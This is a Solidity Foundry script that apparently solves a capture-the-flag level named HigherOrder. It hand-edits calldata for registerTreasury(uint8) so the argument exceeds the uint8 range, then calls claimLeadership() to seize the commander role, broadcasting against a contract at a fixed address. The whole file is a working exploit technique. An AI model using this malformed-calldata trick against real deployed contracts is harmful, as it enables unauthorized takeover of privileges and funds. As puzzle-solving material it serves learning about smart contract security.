// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

pragma experimental ABIEncoderV2;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {HigherOrder} from "../src/HigherOrder.sol";

contract HigherOrderScript is Script {
    function run() public {
        vm.startBroadcast();

        HigherOrder order = HigherOrder(0x290946e26489D5b1Ea59a078Fe9A68D15eafE775);

        bytes memory registerTreasuryCallData = abi.encodeWithSignature("registerTreasury(uint8)", 0xff);
        registerTreasuryCallData[4] = 0xff;

        address(order).call(registerTreasuryCallData);
        console.log("treasury %d", order.treasury());

        order.claimLeadership();
        console.log("commander %s", order.commander());

        vm.stopBroadcast();
    }
}